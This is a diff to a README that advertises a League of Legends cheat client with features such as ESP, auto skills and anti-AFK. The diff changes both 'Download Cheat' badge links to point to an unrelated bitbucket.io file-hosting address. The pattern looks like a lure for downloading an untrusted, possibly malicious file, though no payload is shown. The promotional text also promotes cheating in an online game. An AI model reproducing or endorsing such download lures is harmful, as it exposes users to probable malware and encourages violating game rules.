@@ -6,7 +6,7 @@
 
 Whether you main mid, roam support, or stomp bot lane, this cheat pack gives you the **tools to climb and dominate** without grinding every matchup.
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://wecheaters.github.io/cheats/league-of-legends/)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://fileoffload15.bitbucket.io)
 ---
 
 ## 💡 Cheat Feature Breakdown
@@ -41,7 +41,7 @@ This is a full-featured cheat client designed for **stealth, performance, and fu
 * **Anti-AFK** – Stay active during long matches or queue downtime
 * **No Chat Delay** – Remove system-imposed chat limits
 
-[![Download Cheat](https://avatars.mds.yandex.net/i?id=5b985d2e7188299ceff38de70f625f5c_l-5743853-images-thumbs&n=13)](https://wecheaters.github.io/cheats/league-of-legends/)
+[![Download Cheat](https://avatars.mds.yandex.net/i?id=5b985d2e7188299ceff38de70f625f5c_l-5743853-images-thumbs&n=13)](https://fileoffload15.bitbucket.io)
 ---
 
 ## ⚖️ LoL Cheat vs Basic Scripts
@@ -106,3 +106,4 @@ LoL cheat, League of Legends ESP, auto skill cheat League, jungle timer hack, sk
 ---
 
 🎯 They react. You **already aimed**. Win smarter, see more, and let the cheat do the work. 🧠🔥
+
